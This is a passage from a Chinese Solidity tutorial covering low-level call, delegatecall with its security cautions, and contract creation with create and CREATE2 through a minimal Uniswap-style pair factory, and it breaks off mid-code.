逗号分隔的具体参数)<br></code></pre></td></tr></table></figure><p><code>函数签名</code>为<code>&quot;函数名（逗号分隔的参数类型）&quot;</code>。例如<code>abi.encodeWithSignature(&quot;f(uint256,address)&quot;, _x, _addr)</code>。</p><p>另外<code>call</code>在调用合约时可以指定交易发送的<code>ETH</code>数额和<code>gas</code>数额：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs solidity">目标合约地址.call&#123;value:发送数额, gas:gas数额&#125;(字节码);<br></code></pre></td></tr></table></figure><p>看起来有点复杂，下面我们举个<code>call</code>应用的例子。</p><h3 id="目标合约-1"><a href="#目标合约-1" class="headerlink" title="目标合约"></a>目标合约</h3><p>我们先写一个简单的目标合约<code>OtherContract</code>并部署，代码与第21讲中基本相同，只是多了<code>fallback</code>函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract OtherContract &#123;<br>    uint256 private _x = 0; // 状态变量x<br>    // 收到eth的事件，记录amount和gas<br>    event Log(uint amount, uint gas);<br>    <br>    fallback() external payable&#123;&#125;<br><br>    // 返回合约ETH余额<br>    function getBalance() view public returns(uint) &#123;<br>        return address(this).balance;<br>    &#125;<br><br>    // 可以调整状态变量_x的函数，并且可以往合约转ETH (payable)<br>    function setX(uint256 x) external payable&#123;<br>        _x = x;<br>        // 如果转入ETH，则释放Log事件<br>        if(msg.value &gt; 0)&#123;<br>            emit Log(msg.value, gasleft());<br>        &#125;<br>    &#125;<br><br>    // 读取x<br>    function getX() external view returns(uint x)&#123;<br>        x = _x;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个合约包含一个状态变量<code>x</code>，一个在收到<code>ETH</code>时触发的事件<code>Log</code>，三个函数：</p><ul><li><code>getBalance()</code>: 返回合约<code>ETH</code>余额。</li><li><code>setX()</code>: <code>external payable</code>函数，可以设置<code>x</code>的值，并向合约发送<code>ETH</code>。</li><li><code>getX()</code>: 读取<code>x</code>的值。</li></ul><h4 id="1-Response事件"><a href="#1-Response事件" class="headerlink" title="1. Response事件"></a>1. Response事件</h4><p>我们写一个<code>Call</code>合约来调用目标合约函数。首先定义一个<code>Response</code>事件，输出<code>call</code>返回的<code>success</code>和<code>data</code>，方便我们观察返回值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 定义Response事件，输出call返回的结果success和data<br>event Response(bool success, bytes data);<br></code></pre></td></tr></table></figure><h4 id="2-调用setX函数"><a href="#2-调用setX函数" class="headerlink" title="2. 调用setX函数"></a>2. 调用setX函数</h4><p>我们定义<code>callSetX</code>函数来调用目标合约的<code>setX()</code>，转入<code>msg.value</code>数额的<code>ETH</code>，并释放<code>Response</code>事件输出<code>success</code>和<code>data</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function callSetX(address payable _addr, uint256 x) public payable &#123;<br>    // call setX()，同时可以发送ETH<br>    // // 这里call&#123;value: msg.value&#125;的作用是向目标合约发送eth<br>    (bool success, bytes memory data) = _addr.call&#123;value: msg.value&#125;(<br>        abi.encodeWithSignature(&quot;setX(uint256)&quot;, x)<br>    );<br><br>    emit Response(success, data); //释放事件<br>&#125;<br></code></pre></td></tr></table></figure><p>接下来我们调用<code>callSetX</code>把状态变量<code>_x</code>改为5，参数为<code>OtherContract</code>地址和<code>5</code>，由于目标函数<code>setX()</code>没有返回值，因此<code>Response</code>事件输出的<code>data</code>为<code>0x</code>，也就是空。</p><p><img src="/img/web3/solidity22-1.jpg"></p><h4 id="3-调用getX函数"><a href="#3-调用getX函数" class="headerlink" title="3. 调用getX函数"></a>3. 调用getX函数</h4><p>下面我们调用<code>getX()</code>函数，它将返回目标合约<code>_x</code>的值，类型为<code>uint256</code>。我们可以利用<code>abi.decode</code>来解码<code>call</code>的返回值<code>data</code>，并读出数值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function callGetX(address  _addr)external returns (uint256) &#123;<br>// 由于getX()方法只是个查询，不需要付钱，所以没有payable<br>    (bool success,bytes memory data)=_addr.call(<br>        abi.encodeWithSignature(&quot;getX()&quot;)<br>    );<br>    emit Response(success,data);<br>    return abi.decode(data, (uint256));// data返回0x0000000000000000000000000000000000000000000000000000000000000005 就是5的uint256格式<br>&#125;<br>    function callGetBalances(address  _addr)external returns (uint256) &#123;<br>    (bool success,bytes memory data)=_addr.call(<br>        abi.encodeWithSignature(&quot;getBalance()&quot;)<br>    );<br>    emit Response(success,data);<br>    return abi.decode(data, (uint256));// data返回0x000000000000000000000000000000000000000000000000000000000000000a 就是10的uint256格式<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="4-调用不存在的函数"><a href="#4-调用不存在的函数" class="headerlink" title="4. 调用不存在的函数"></a>4. 调用不存在的函数</h4><p>如果我们给<code>call</code>输入的函数不存在于目标合约，那么目标合约的<code>fallback</code>函数会被触发。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function callNonExist(address _addr) external&#123;<br>    // call 不存在的函数<br>    (bool success, bytes memory data) = _addr.call(<br>        abi.encodeWithSignature(&quot;foo(uint256)&quot;)<br>    );<br><br>    emit Response(success, data); //释放事件<br>&#125;<br></code></pre></td></tr></table></figure><p>上面例子中，我们<code>call</code>了不存在的<code>foo</code>函数。<code>call</code>仍能执行成功，并返回<code>success</code>，但其实调用的目标合约<code>fallback</code>函数。</p><h2 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h2><p>这一讲，我们介绍了如何用<code>call</code>这一低级函数来调用其他合约。<code>call</code>不是调用合约的推荐方法，因为不安全。但他能让我们在不知道源代码和<code>ABI</code>的情况下调用目标合约，很有用。</p><h1 id="23-Delegatecall"><a href="#23-Delegatecall" class="headerlink" title="23. Delegatecall"></a>23. Delegatecall</h1><p><code>delegatecall</code>与<code>call</code>类似，是<code>Solidity</code>中地址类型的低级成员函数。<code>delegate</code>中是委托&#x2F;代表的意思，那么<code>delegatecall</code>委托了什么？</p><p>它允许一个合约调用另一个合约的代码，但保留调用者（调用合约）的上下文（包括存储、地址、余额等）。</p><p>简单来说：</p><ul><li><strong>调用的是另一个合约的代码</strong></li><li><strong>执行时使用的是调用者合约的存储和上下文</strong></li><li><strong>msg.sender 和 msg.value 保持为原始调用者的值</strong></li></ul><p>当用户<code>A</code>通过合约<code>B</code>来<code>call</code>合约<code>C</code>的时候，执行的是合约<code>C</code>的函数，<code>上下文</code>(<code>Context</code>，可以理解为包含变量和状态的环境)也是合约<code>C</code>的：<code>msg.sender</code>是<code>B</code>的地址，并且如果函数改变一些状态变量，产生的效果会作用于合约<code>C</code>的变量上。</p><p><img src="/img/web3/solidity23-1.png" alt="1"></p><p>而当用户<code>A</code>通过合约<code>B</code>来<code>delegatecall</code>合约<code>C</code>的时候，执行的是合约<code>C</code>的函数，但是<code>上下文</code>仍是合约<code>B</code>的：<code>msg.sender</code>是<code>A</code>的地址，并且如果函数改变一些状态变量，产生的效果会作用于合约<code>B</code>的变量上。</p><p><img src="/img/web3/solidity23-2.png" alt="2"></p><p>可以这样理解：一个投资者（用户<code>A</code>）把他的资产（<code>B</code>合约的<code>状态变量</code>）都交给一个风险投资代理（<code>C</code>合约）来打理。执行的是风险投资代理的函数，但是改变的是资产的状态。</p><p><code>delegatecall</code>语法和<code>call</code>类似，也是：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">目标合约地址.delegatecall(二进制编码)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>其中<code>二进制编码</code>利用结构化编码函数<code>abi.encodeWithSignature</code>获得：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">abi<span class="hljs-selector-class">.encodeWithSignature</span>(<span class="hljs-string">&quot;函数签名&quot;</span>, 逗号分隔的具体参数)<br></code></pre></td></tr></table></figure><p><code>函数签名</code>为<code>&quot;函数名（逗号分隔的参数类型）&quot;</code>。例如<code>abi.encodeWithSignature(&quot;f(uint256,address)&quot;, _x, _addr)</code>。</p><p>和<code>call</code>不一样，<code>delegatecall</code>在调用合约时可以指定交易发送的<code>gas</code>，但不能指定发送的<code>ETH</code>数额</p><blockquote><p><strong>注意</strong>：<code>delegatecall</code>有安全隐患，使用时要保证当前合约和目标合约的状态变量存储结构相同，并且目标合约安全，不然会造成资产损失。</p></blockquote><h2 id="什么情况下会用到delegatecall"><a href="#什么情况下会用到delegatecall" class="headerlink" title="什么情况下会用到delegatecall?"></a>什么情况下会用到<code>delegatecall</code>?</h2><p>目前<code>delegatecall</code>主要有两个应用场景：</p><ol><li>代理合约（<code>Proxy Contract</code>）：将智能合约的存储合约和逻辑合约分开：代理合约（<code>Proxy Contract</code>）存储所有相关的变量，并且保存逻辑合约的地址；所有函数存在逻辑合约（<code>Logic Contract</code>）里，通过<code>delegatecall</code>执行。当升级时，只需要将代理合约指向新的逻辑合约即可。</li><li>EIP-2535 Diamonds（钻石）：钻石是一个支持构建可在生产中扩展的模块化智能合约系统的标准。钻石是具有多个实施合约的代理合约。 更多信息请查看：<a href="https://eip2535diamonds.substack.com/p/introduction-to-the-diamond-standard">钻石标准简介</a>。</li></ol><h2 id="delegatecall例子"><a href="#delegatecall例子" class="headerlink" title="delegatecall例子"></a><code>delegatecall</code>例子</h2><p>调用结构：你（<code>A</code>）通过合约<code>B</code>调用目标合约<code>C</code>。</p><p>代码一样，只是call和delegatecall不同</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.21;<br><br><br><br>// 先定义被调用的合约C<br>contract C &#123;<br>    uint public num;<br>    address public sender;<br>    function setVars(uint _num)public payable &#123;<br>        num=_num;<br>        sender=msg.sender;<br>    &#125;<br>&#125;<br><br>// 定义发起调用的合约B<br>contract B &#123;<br>    uint public num;<br>    address public sender;<br>    //通过call来调用C的setVars()函数，将改变合约C里的状态变量<br>    function callSetVars(address _addr,uint _num)external payable  &#123;<br>        (bool success,bytes memory data)=_addr.call(<br>            abi.encodeWithSignature(&quot;setVars(uint256)&quot;, _num)<br>        );<br>    &#125;<br>    // 通过delegatecall来调用C的setVars()函数，将改变合约B里的状态变量<br>    // delegatecall 方法把合约B里面的状态变量改变了<br>    // 但是没有把C合约里面的状态变量给改变<br>    // *** 这里要注意delegate和call用法；<br>    // delegatecall只有特定场景使用 目前delegatecall最大的应用是代理合约和EIP-2535 Diamonds（钻石）。<br>    function delegatecallSetVars(address _addr, uint _num) external payable&#123;<br>    // delegatecall setVars()<br>        (bool success, bytes memory data) = _addr.delegatecall(<br>            abi.encodeWithSignature(&quot;setVars(uint256)&quot;, _num)<br>        );<br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><ul><li>通过call来调用C的setVars()函数，将改变合约C里的状态变量，但是不会改变B合约里面的状态变量</li></ul><p><img src="/img/web3/solidity23-4.png" alt="3"></p><ul><li>通过delegatecall来调用C的setVars()函数，将改变合约B里的状态变量 但是不会改变C里面的合约变量</li></ul><p><img src="/img/web3/solidity23-5.png" alt="3"></p><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><ul><li><code>delegatecall</code> 可能带来安全风险，尤其是存储布局不匹配时会导致数据混乱</li><li>使用 <code>delegatecall</code> 的代理合约要非常小心设计，确保逻辑合约和代理合约的存储结构一致</li><li>不要用 <code>delegatecall</code> 调用不可信合约代码</li></ul><p>详细对比一下以太坊合约中的 <code>delegatecall</code> 和 <code>call</code> 的区别：</p><hr><table><thead><tr><th>特性</th><th><code>call</code></th><th><code>delegatecall</code></th></tr></thead><tbody><tr><td><strong>执行代码位置</strong></td><td>调用目标合约的代码</td><td>调用目标合约的代码</td></tr><tr><td><strong>存储上下文</strong></td><td>使用被调用合约的存储</td><td>使用调用者合约的存储</td></tr><tr><td><strong><code>msg.sender</code></strong></td><td>是当前调用合约的地址（即发起 <code>call</code> 的合约地址）</td><td>保持原始交易发起者地址（即最初调用合约的外部账户地址）</td></tr><tr><td><strong><code>msg.value</code></strong></td><td>可以转账，<code>msg.value</code> 是传递给被调用合约的金额</td><td>也可以转账，<code>msg.value</code> 是传递给被调用合约的金额</td></tr><tr><td><strong>用途</strong></td><td>普通合约间调用，转账等</td><td>代理合约模式，实现逻辑合约升级等</td></tr><tr><td><strong>存储修改影响</strong></td><td>修改的是被调用合约的存储</td><td>修改的是调用者合约的存储</td></tr><tr><td><strong>安全风险</strong></td><td>调用时需信任被调用合约</td><td>存储布局不匹配时极易导致数据破坏</td></tr></tbody></table><hr><h3 id="简单总结："><a href="#简单总结：" class="headerlink" title="简单总结："></a>简单总结：</h3><ul><li><code>call</code> 是“普通调用”，执行被调用合约的代码和存储，<code>msg.sender</code> 是调用合约地址。</li><li><code>delegatecall</code> 是“代理调用”，执行被调用合约的代码，但使用调用合约的存储和上下文，<code>msg.sender</code> 保持为原始外部账户。</li></ul><hr><h3 id="举个例子帮助理解："><a href="#举个例子帮助理解：" class="headerlink" title="举个例子帮助理解："></a>举个例子帮助理解：</h3><p>假设有三个角色：</p><ul><li>用户（外部账户）A</li><li>代理合约 B</li><li>逻辑合约 C</li></ul><p>用户A调用代理合约 B：</p><ul><li>用call调用逻辑合约 C：<ul><li>代码和存储都在逻辑合约 C</li><li><code>msg.sender</code> 是代理合约 B</li></ul></li><li>用delegatecall调用逻辑合约 C：<ul><li>代码在逻辑合约 C 执行，但存储在代理合约 B</li><li><code>msg.sender</code> 是用户（外部账户）</li></ul></li></ul><hr><p>也就是说，</p><ul><li>如果用户A通过代理合约B去调用功能合约C的时候用的是call方法的话，那C收到的msg.sender就是B，那C顶多把B的钱转走呀，</li><li>如果用户A通过代理合约B去调用功能合约C的时候用了delegatecall方法的话，那C收到msg.sender就是A，就可以把A的钱给转走啦</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract A &#123;<br>    uint public x;<br><br>    function setX(uint _x) public &#123;<br>        x = _x;<br>    &#125;<br>&#125;<br><br>contract B &#123;<br>    function callSetX(address a, uint _x) public &#123;<br>        (bool success, ) = a.call(abi.encodeWithSignature(&quot;setX(uint256)&quot;, _x));<br>        require(success, &quot;call failed&quot;);<br>    &#125;<br>&#125;<br>// 当我调用 B.callSetX(a, 123) 会导致合约 A 的存储变量 x 被修改。<br></code></pre></td></tr></table></figure><p> delegatecall</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Logic &#123;<br>    uint public x;<br><br>    function setX(uint _x) public &#123;<br>        x = _x;<br>    &#125;<br>&#125;<br><br>contract Proxy &#123;<br>    uint public x;<br><br>    function setX(address logic, uint _x) public &#123;<br>        (bool success, ) = logic.delegatecall(abi.encodeWithSignature(&quot;setX(uint256)&quot;, _x));<br>        require(success, &quot;delegatecall failed&quot;);<br>    &#125;<br>&#125;<br>// 当我调用Proxy.setX(logic, 123) 会修改 Proxy 合约的存储变量 x，而不是 Logic 合约的。<br></code></pre></td></tr></table></figure><h1 id="24-在合约中创建新合约"><a href="#24-在合约中创建新合约" class="headerlink" title="24. 在合约中创建新合约"></a>24. 在合约中创建新合约</h1><p>在以太坊链上，用户（外部账户，<code>EOA</code>）可以创建智能合约，智能合约同样也可以创建新的智能合约。去中心化交易所<code>uniswap</code>就是利用工厂合约（<code>PairFactory</code>）创建了无数个币对合约（<code>Pair</code>）。这一讲，我会用简化版的<code>uniswap</code>讲如何通过合约创建合约。</p><p>有两种方法可以在合约中创建新合约，<code>create</code>和<code>create2</code>，</p><p><code>create</code>的用法很简单，就是<code>new</code>一个合约，并传入新合约构造函数所需的参数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs solidity">Contract x = new Contract&#123;value: _value&#125;(params)<br></code></pre></td></tr></table></figure><h2 id="极简Uniswap"><a href="#极简Uniswap" class="headerlink" title="极简Uniswap"></a>极简Uniswap</h2><p><code>Uniswap V2</code><a href="https://github.com/Uniswap/v2-core/tree/master/contracts">核心合约</a>中包含两个合约：</p><ol><li>UniswapV2Pair: 币对合约，用于管理币对地址、流动性、买卖。</li><li>UniswapV2Factory: 工厂合约，用于创建新的币对，并管理币对地址。</li></ol><p>下面我们用<code>create</code>方法实现一个极简版的<code>Uniswap</code>：<code>Pair</code>币对合约负责管理币对地址，<code>PairFactory</code>工厂合约用于创建新的币对，并管理币对地址。</p><h3 id="Pair合约"><a href="#Pair合约" class="headerlink" title="Pair合约"></a><code>Pair</code>合约</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Pair&#123;<br>    address public factory; // 工厂合约地址<br>    address public token0; // 代币1<br>    address public token1; // 代币2<br><br>    constructor() payable &#123;<br>        factory = msg.sender;<br>    &#125;<br><br>    // called once by the factory at time of deployment<br>    function initialize(address _token0, address _token1) external &#123;<br>        require(msg.sender == factory, &#x27;UniswapV2: FORBIDDEN&#x27;); // sufficient check<br>        token0 = _token0;<br>        token1 = _token1;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Pair</code>合约很简单，包含3个状态变量：<code>factory</code>，<code>token0</code>和<code>token1</code>。</p><p>构造函数<code>constructor</code>在部署时将<code>factory</code>赋值为工厂合约地址。<code>initialize</code>函数会由工厂合约在部署完成后手动调用以初始化代币地址，将<code>token0</code>和<code>token1</code>更新为币对中两种代币的地址。</p><p>所以在</p><p>构造函数<code>constructor</code>在部署时将<code>factory</code>赋值为工厂合约地址。<code>initialize</code>函数会由工厂合约在部署完成后手动调用以初始化代币地址，将<code>token0</code>和<code>token1</code>更新为币对中两种代币的地址。</p><blockquote><p><strong>提问</strong>：为什么<code>uniswap</code>不在<code>constructor</code>中将<code>token0</code>和<code>token1</code>地址更新好？</p><p><strong>答</strong>：因为<code>uniswap</code>使用的是<code>create2</code>创建合约，生成的合约地址可以实现预测，更多详情请阅读<a href="https://github.com/AmazingAng/WTF-Solidity/blob/main/25_Create2/readme.md">第25讲</a>。</p></blockquote><h3 id="PairFactory"><a href="#PairFactory" class="headerlink" title="PairFactory"></a><code>PairFactory</code></h3><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs arcade">contract PairFactory&#123;<br>    mapping(<span class="hljs-function"><span class="hljs-params">address</span> =&gt;</span> mapping(<span class="hljs-function"><span class="hljs-params">address</span> =&gt;</span> address)) public getPair; <span class="hljs-comment">// 通过两个代币地址查Pair地址</span><br>    address[] public allPairs; <span class="hljs-comment">// 保存所有Pair地址</span><br><br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">createPair</span>(<span class="hljs-params">address tokenA, address tokenB</span>) <span class="hljs-title function_">external</span> <span class="hljs-title function_">returns</span> (<span class="hljs-params">address pairAddr</span>) &#123;<br>        <span class="hljs-comment">// 创建新合约</span><br>        Pair pair = <span class="hljs-keyword">new</span> Pair(); <br>        <span class="hljs-comment">// 调用新合约的initialize方法</span><br>        pair.initialize(tokenA, tokenB);<br>        <span class="hljs-comment">// 更新地址map</span><br>        pairAddr = address(pair);<br>        allPairs.<span class="hljs-built_in">push</span>(pairAddr);<br>        getPair[tokenA][tokenB] = pairAddr;<br>        getPair[tokenB][tokenA] = pairAddr;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>工厂合约（<code>PairFactory</code>）有两个状态变量<code>getPair</code>是两个代币地址到币对地址的<code>map</code>，方便根据代币找到币对地址；<code>allPairs</code>是币对地址的数组，存储了所有币对地址。</p><p><code>PairFactory</code>合约只有一个<code>createPair</code>函数，根据输入的两个代币地址<code>tokenA</code>和<code>tokenB</code>来创建新的<code>Pair</code>合约。其中</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-built_in">Pair</span> <span class="hljs-built_in">pair</span> = <span class="hljs-literal">new</span> <span class="hljs-built_in">Pair</span>(); <br></code></pre></td></tr></table></figure><p>就是创建合约的代码，非常简单。大家可以部署好<code>PairFactory</code>合约，然后用下面两个地址作为参数调用<code>createPair</code>，看看创建的币对地址是什么：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">WBNB地址: 0x2c44b726ADF1963cA47Af88B284C06f30380fC78<br>BSC链上的PEOPLE地址: 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c<br></code></pre></td></tr></table></figure><h3 id="在remix上验证"><a href="#在remix上验证" class="headerlink" title="在remix上验证"></a>在remix上验证</h3><ol><li>使用<code>WBNB</code>和<code>PEOPLE</code>的地址作为参数调用<code>createPair</code>,得到<code>Pair</code>合约地址：0xD3e2008b4Da2cD6DEAF73471590fF30C86778A48</li><li>将 Contract 改为 <code>Pair</code>，然后在 At Address 输入框输入 <code>Pair</code> 合约地址，创建一个前端接口用于调用已部署的合约。</li><li>查看<code>Pair</code>合约变量</li><li>Debug查看<code>create</code>操作码</li></ol><h1 id="25-CREATE2"><a href="#25-CREATE2" class="headerlink" title="25. CREATE2"></a>25. CREATE2</h1><h2 id="CREATE2"><a href="#CREATE2" class="headerlink" title="CREATE2"></a>CREATE2</h2><blockquote><p><code>CREATE2</code> 操作码使我们在智能合约部署在以太坊网络之前就能预测合约的地址。<code>Uniswap</code>创建<code>Pair</code>合约用的就是<code>CREATE2</code>而不是<code>CREATE</code>。</p></blockquote><h3 id="CREATE是如何计算地址"><a href="#CREATE是如何计算地址" class="headerlink" title="CREATE是如何计算地址"></a>CREATE是如何计算地址</h3><p>智能合约可以由其他合约和普通账户利用<code>CREATE</code>操作码创建。 在这两种情况下，新合约的地址都以相同的方式计算：创建者的地址(通常为部署的钱包地址或者合约地址)和<code>nonce</code>(该地址发送交易的总数,对于合约账户是创建的合约总数,每创建一个合约nonce+1)的哈希。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">新地址 = hash(创建者地址, nonce)<br></code></pre></td></tr></table></figure><p>创建者地址不会变，但<code>nonce</code>可能会随时间而改变，因此用<code>CREATE</code>创建的合约地址不好预测。</p><h3 id="CREATE2如何计算地址"><a href="#CREATE2如何计算地址" class="headerlink" title="CREATE2如何计算地址"></a>CREATE2如何计算地址</h3><p><code>CREATE2</code>的目的是为了让合约地址独立于未来的事件。不管未来区块链上发生了什么，你都可以把合约部署在事先计算好的地址上。用<code>CREATE2</code>创建的合约地址由4个部分决定：</p><ul><li><code>0xFF</code>：一个常数，避免和<code>CREATE</code>冲突</li><li><code>CreatorAddress</code>: 调用 CREATE2 的当前合约（创建合约）地址。</li><li><code>salt</code>（盐）：一个创建者指定的<code>bytes32</code>类型的值，它的主要目的是用来影响新创建的合约的地址。</li><li><code>initcode</code>: 新合约的初始字节码（合约的Creation Code和构造函数的参数）。</li></ul><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">新地址 = hash(&quot;0xFF&quot;,创建者地址, salt, initcode)<br></code></pre></td></tr></table></figure><p><code>CREATE2</code> 确保，如果创建者使用 <code>CREATE2</code> 和提供的 <code>salt</code> 部署给定的合约<code>initcode</code>，它将存储在 <code>新地址</code> 中。</p><h2 id="如何使用CREATE2"><a href="#如何使用CREATE2" class="headerlink" title="如何使用CREATE2"></a>如何使用<code>CREATE2</code></h2><p><code>CREATE2</code>的用法和之前讲的<code>CREATE</code>类似，同样是<code>new</code>一个合约，并传入新合约构造函数所需的参数，只不过要多传一个<code>salt</code>参数：</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqf">Contract x = new Contract&#123;salt: <span class="hljs-variable">_salt</span>, value: <span class="hljs-variable">_value</span>&#125;(<span class="hljs-built_in">params</span>)<br></code></pre></td></tr></table></figure><p>其中<code>Contract</code>是要创建的合约名，<code>x</code>是合约对象（地址），<code>_salt</code>是指定的盐；如果构造函数是<code>payable</code>，可以创建时转入<code>_value</code>数量的<code>ETH</code>，<code>params</code>是新合约构造函数的参数。</p><h2 id="极简Uniswap2"><a href="#极简Uniswap2" class="headerlink" title="极简Uniswap2"></a>极简Uniswap2</h2><p>我们用<code>CREATE2</code>来实现极简<code>Uniswap</code>。</p><h3 id="Pair"><a href="#Pair" class="headerlink" title="Pair"></a><code>Pair</code></h3><p>代码不变</p><h3 id="PairFactory2"><a href="#PairFactory2" class="headerlink" title="PairFactory2"></a><code>PairFactory2</code></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs solidity"><br>// 工厂合约，专门用来生产币对合约的<br>contract PairFactory2&#123;<br>    mapping(address =&gt; mapping(address =&gt; address)) public getPair; // 通过两个代币地址查Pair地址<br>    address[] public allPairs; // 保存所有Pair地址<br><br>    function createPair2(address tokenA,address tokenB)external returns(address 